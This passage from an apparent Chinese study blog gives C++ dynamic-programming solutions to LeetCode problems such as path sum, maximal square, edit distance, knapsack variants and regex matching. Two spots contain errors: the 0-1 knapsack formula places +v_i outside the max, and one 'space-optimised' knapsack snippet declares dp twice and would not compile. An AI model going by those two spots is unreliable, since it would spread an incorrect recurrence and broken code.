<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minPathSum</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m=grid.<span class="built_in">size</span>(),n=grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=grid[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">            dp[<span class="number">0</span>][i]=dp[<span class="number">0</span>][i<span class="number">-1</span>]+grid[<span class="number">0</span>][i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;m;i++)</span><br><span class="line">            dp[i][<span class="number">0</span>]=dp[i<span class="number">-1</span>][<span class="number">0</span>]+grid[i][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;n;j++)</span><br><span class="line">                dp[i][j]=<span class="built_in">min</span>(dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>])+grid[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>dp[i][j]=min(dp[i-1][j],dp[i][j-1])+grid[i][j]</code>只与两个数有关，可以压缩到一维。对于第i行，在求第j列时，前j-1列已经更新，dp[j-1]代表dp[i][j-1]；dp[j]待更新，当前存储dp[i-1][j]。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minPathSum</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>(), n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>]=grid[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">            dp[j]=dp[j<span class="number">-1</span>]+grid[<span class="number">0</span>][j];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>]+=grid[i][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;n;j++)</span><br><span class="line">                dp[j]=<span class="built_in">min</span>(dp[j],dp[j<span class="number">-1</span>])+grid[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="2-3-滚动数组">2.3 滚动数组</h2>
<h4 id="2-3-1-1-221-最大正方形">2.3.1.1 <a href="https://leetcode.cn/problems/maximal-square/">221. 最大正方形</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximalSquare</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m=matrix.<span class="built_in">size</span>(),n=matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m<span class="number">+1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n<span class="number">+1</span>));</span><br><span class="line">        <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[i<span class="number">-1</span>][j<span class="number">-1</span>]==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">                    <span class="type">int</span> edge=<span class="built_in">min</span>(dp[i<span class="number">-1</span>][j<span class="number">-1</span>],<span class="built_in">min</span>(dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>]));</span><br><span class="line">                    dp[i][j]=edge<span class="number">+1</span>;</span><br><span class="line">                    ret=<span class="built_in">max</span>(ret,edge<span class="number">+1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret*ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>滚动数组压缩，只需要保存两行的结果。在位置为0时需要修改相应值，否则记录的是前面两行对应列位置的值。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximalSquare</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m=matrix.<span class="built_in">size</span>(),n=matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(<span class="number">2</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n<span class="number">+1</span>));</span><br><span class="line">        <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="type">int</span> idx=i%<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(matrix[i<span class="number">-1</span>][j<span class="number">-1</span>]==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">                    <span class="type">int</span> edge=<span class="built_in">min</span>(dp[<span class="number">1</span>-idx][j<span class="number">-1</span>],<span class="built_in">min</span>(dp[<span class="number">1</span>-idx][j],dp[idx][j<span class="number">-1</span>]));</span><br><span class="line">                    dp[idx][j]=edge<span class="number">+1</span>;</span><br><span class="line">                    ret=<span class="built_in">max</span>(ret,edge<span class="number">+1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//关键</span></span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    dp[idx][j]=<span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret*ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>3 二维DP</h1>
<p><a href="https://leetcode-cn.com/problems/edit-distance/">72. 编辑距离</a>（<mark>583题的动态规划的变体</mark>）</p>
<blockquote>
<p>给你两个单词 word1 和 word2， 请返回将 word1 转换成 word2 所使用的最少操作数  。</p>
<p>你可以对一个单词进行如下三种操作：</p>
<p>插入一个字符、删除一个字符、替换一个字符</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m=word<span class="number">1.</span><span class="built_in">size</span>(),n=word<span class="number">2.</span><span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m<span class="number">+1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n<span class="number">+1</span>,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">            dp[i][<span class="number">0</span>]=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">            dp[<span class="number">0</span>][j]=j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(word1[i<span class="number">-1</span>]==word2[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment">// word1删除一个字符 word2删除一个字符 替换一个字符</span></span><br><span class="line">                    dp[i][j]=<span class="built_in">min</span>( <span class="built_in">min</span>(dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>]),dp[i<span class="number">-1</span>][j<span class="number">-1</span>])<span class="number">+1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>4 背包DP</h1>
<blockquote>
<p>背包问题是一种组合优化的 NP 完全问题：有 N 个物品和容量为 W 的背包，每个物品都有自己的体积 w 和价值 v，求拿哪些物品可以使得背包所装下物品的总价值最大。如果限定每种物品只能选择 0 个或 1 个，则问题称为 0-1 背包问题；如果不限定每种物品的数量，则问题称为无 界背包问题或完全背包问题。</p>
</blockquote>
<h2 id="4-1-0-1背包">4.1 0-1背包</h2>
<p>$$<br>
前i件物品体积不超过j的情况下能达到的最大价值\<br>
dp[i][j]=max(dp[i-1][j],dp[i-1][j-w_i])+v_i\<br>
时间复杂度：O(NM)\<br>
空间复杂度：O(NM)<br>
$$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//N个物品，体积最大为W</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxValue</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights,vector&lt;<span class="type">int</span>&gt; values,<span class="type">int</span> N,<span class="type">int</span> W)</span></span>&#123;</span><br><span class="line"> 	vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(N<span class="number">+1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(W<span class="number">+1</span>,<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="type">int</span> w=weights[i<span class="number">-1</span>],v=values[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=W;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j&gt;=w)&#123;</span><br><span class="line">                dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j-w]+v);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][j]=dp[i<span class="number">-1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[N][W];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>空间优化：</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202304122327709.png" alt="image-20230412232726661"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxValue</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights,vector&lt;<span class="type">int</span>&gt; values,<span class="type">int</span> N,<span class="type">int</span> W)</span></span>&#123;</span><br><span class="line"> 	vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(N<span class="number">+1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(W<span class="number">+1</span>,<span class="number">0</span>));</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(W<span class="number">+1</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="type">int</span> w=weights[i<span class="number">-1</span>],v=values[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=W;j&gt;=w;j--)&#123;</span><br><span class="line">           dp[j]=<span class="built_in">max</span>(dp[j],dp[j-w]+v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[W];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="4-2-完全背包">4.2 完全背包</h2>
<p>假设物品$i=2,w=2,v=3$，<br>
$$<br>
\begin{aligned}<br>
dp[2][5]=max(dp[1][5],dp[1][3]+3,dp[1][1]+6)\<br>
dp[2][3]=max(dp[1][3],dp[1][1]+3)\<br>
\Longrightarrow dp[2][5]=max(dp[1][5],dp[2][3]+3)\<br>
完全背包：dp[i][j]=max(dp[i-1][j],dp[i][j-w]+v)\<br>
0-1背包：dp[i][j]=max(dp[i-1][j],dp[i-1][j-w]+v)<br>
\end{aligned}<br>
$$<br>
<img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202304122333011.png" alt="image-20230412233307972"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//N个物品，体积最大为W</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxValue</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights,vector&lt;<span class="type">int</span>&gt; values,<span class="type">int</span> N,<span class="type">int</span> W)</span></span>&#123;</span><br><span class="line"> 	vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(N<span class="number">+1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(W<span class="number">+1</span>,<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="type">int</span> w=weights[i<span class="number">-1</span>],v=values[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=W;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j&gt;=w)&#123;</span><br><span class="line">                dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i][j-w]+v);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][j]=dp[i<span class="number">-1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[N][W];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//空间优化</span></span><br><span class="line"><span class="comment">//N个物品，体积最大为W</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxValue</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights,vector&lt;<span class="type">int</span>&gt; values,<span class="type">int</span> N,<span class="type">int</span> W)</span></span>&#123;</span><br><span class="line"> 	<span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(W<span class="number">+1</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="type">int</span> weight=weights[i<span class="number">-1</span>],v=values[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=weight;j&lt;=W;j++)&#123;</span><br><span class="line">           dp[j]=<span class="built_in">max</span>(dp[j],dp[j-weight]+v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[W];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="4-2-1-1-474-一和零">4.2.1.1 <a href="https://leetcode.cn/problems/ones-and-zeroes/">474. 一和零</a></h4>
<p>$$<br>
dp[i][j][k]=max(dp[i-1][j][k],dp[i-1][j-zero][k-one])<br>
$$</p>
<blockquote>
<p>从三维压缩到二维，因此需要倒序遍历</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findMaxForm</span><span class="params">(vector&lt;string&gt;&amp; strs, <span class="type">int</span> m, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m<span class="number">+1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n<span class="number">+1</span>,<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(string &amp;s:strs)&#123;</span><br><span class="line">            <span class="type">int</span> zero=<span class="number">0</span>,one=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">char</span> ch:s)&#123;</span><br><span class="line">                <span class="keyword">if</span>(ch==<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                    one++;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    zero++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=m;i&gt;=zero;i--)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j=n;j&gt;=one;j--)&#123;</span><br><span class="line">                   dp[i][j]=<span class="built_in">max</span>(dp[i][j],dp[i-zero][j-one]<span class="number">+1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><a href="https://leetcode.cn/problems/count-of-sub-multisets-with-bounded-sum/description/">2902. 和带限制的子多重集合的数目 - 力扣（LeetCode）</a></p>
<p>0-1背包：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox0" checked="true"><label for="checkbox0"></label><a href="https://leetcode.cn/problems/partition-equal-subset-sum/">416. 分割等和子集</a></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox1" checked="true"><label for="checkbox1"></label><a href="https://leetcode.cn/problems/ones-and-zeroes/">474. 一和零</a></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox2" checked="true"><label for="checkbox2"></label><a href="https://leetcode.cn/problems/target-sum/">494. 目标和</a>（回溯，DP）<br>
$$<br>
选取部分数字构成负数：\<br>
(sum-neg)-neg=target\<br>
neg=\frac{sum-target}{2}\<br>
\<br>
选取部分数字构成正数：\<br>
act-neg=target\<br>
act+neg=sum\<br>
act=\frac{sum+target}{2}<br>
$$</p>
</li>
<li class="lvl-2">
<p>[ ]</p>
</li>
<li class="lvl-2">
<h4 id="879-盈利计划"><a href="https://leetcode.cn/problems/profitable-schemes/">879. 盈利计划</a></h4>
</li>
<li class="lvl-2">
<h4 id="1049-最后一块石头的重量-II"><a href="https://leetcode.cn/problems/last-stone-weight-ii/">1049. 最后一块石头的重量 II</a></h4>
</li>
</ul>
<p>完全背包：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox3" checked="true"><label for="checkbox3"></label><a href="https://leetcode.cn/problems/coin-change/">322. 零钱兑换</a></p>
</li>
</ul>
<p><a href="https://leetcode.cn/problems/target-sum/solution/mu-biao-he-by-leetcode-solution-o0cp/">目标和 - 目标和 - 力扣（LeetCode）</a></p>
<h1>5 字符串编辑</h1>
<h4 id="5-1-1-1-10-正则表达式匹配">5.1.1.1 <a href="https://leetcode.cn/problems/regular-expression-matching/">10. 正则表达式匹配</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isMatch</span><span class="params">(string s, string p)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = s.<span class="built_in">size</span>(), n = p.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">dp</span>(m + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n + <span class="number">1</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p[i - <span class="number">1</span>] == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                dp[<span class="number">0</span>][i] = dp[<span class="number">0</span>][i - <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (p[j - <span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p[j - <span class="number">1</span>] != <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] &amp;&amp; (s[i - <span class="number">1</span>] == p[j - <span class="number">1</span>]);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p[j - <span class="number">2</span>] != <span class="string">&#x27;.&#x27;</span> &amp;&amp; p[j - <span class="number">2</span>] != s[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="comment">// 不用前面那个字符</span></span><br><span class="line">                    dp[i][j] = dp[i][j - <span class="number">2</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 用0次，再用一次，用一次(用一次的情况会被遍历到)</span></span><br><span class="line">                    dp[i][j] = dp[i][j - <span class="number">2</span>] || dp[i - <span class="number">1</span>][j] ;<span class="comment">//|| dp[i][j - 1];</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox4" checked="true"><label for="checkbox4"></label><a href="https://leetcode.cn/problems/longest-common-subsequence/">1143. 最长公共子序列</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestCommonSubsequence</span><span class="params">(string text1, string text2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m=text<span class="number">1.</span><span class="built_in">size</span>(),n=text<span class="number">2.</span><span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m<span class="number">+1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n<span class="number">+1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(text1[i<span class="number">-1</span>]==text2[j<span class="number">-1</span>])&#123;</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>]<span class="number">+1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox5"><label for="checkbox5">#### </label><a href="https://leetcode.cn/problems/longest-uncommon-subsequence-ii/">522. 最长特殊序列 II</a></p>
<blockquote>
<p>双指针判断s1是否是s2的子序列</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findLUSlength</span><span class="params">(vector&lt;string&gt;&amp; strs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> is_subseq = [](<span class="type">const</span> string&amp; s, <span class="type">const</span> string&amp; t) -&gt; <span class="type">bool</span> &#123;</span><br><span class="line">            <span class="type">int</span> pt_s = <span class="number">0</span>, <span class="type">pt_t</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (pt_s &lt; s.<span class="built_in">size</span>() &amp;&amp; <span class="type">pt_t</span> &lt; t.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[pt_s] == t[<span class="type">pt_t</span>]) &#123;</span><br><span class="line">                    ++pt_s;</span><br><span class="line">                &#125;</span><br><span class="line">                ++<span class="type">pt_t</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> pt_s == s.<span class="built_in">size</span>();</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> n = strs.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="type">bool</span> check = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i != j &amp;&amp; <span class="built_in">is_subseq</span>(strs[i], strs[j])) &#123;</span><br><span class="line">                    check = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (check) &#123;</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(strs[i].<span class="built_in">size</span>()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox6"><label for="checkbox6"></label><a href="https://leetcode.cn/problems/edit-distance/">72. 编辑距离</a></p>
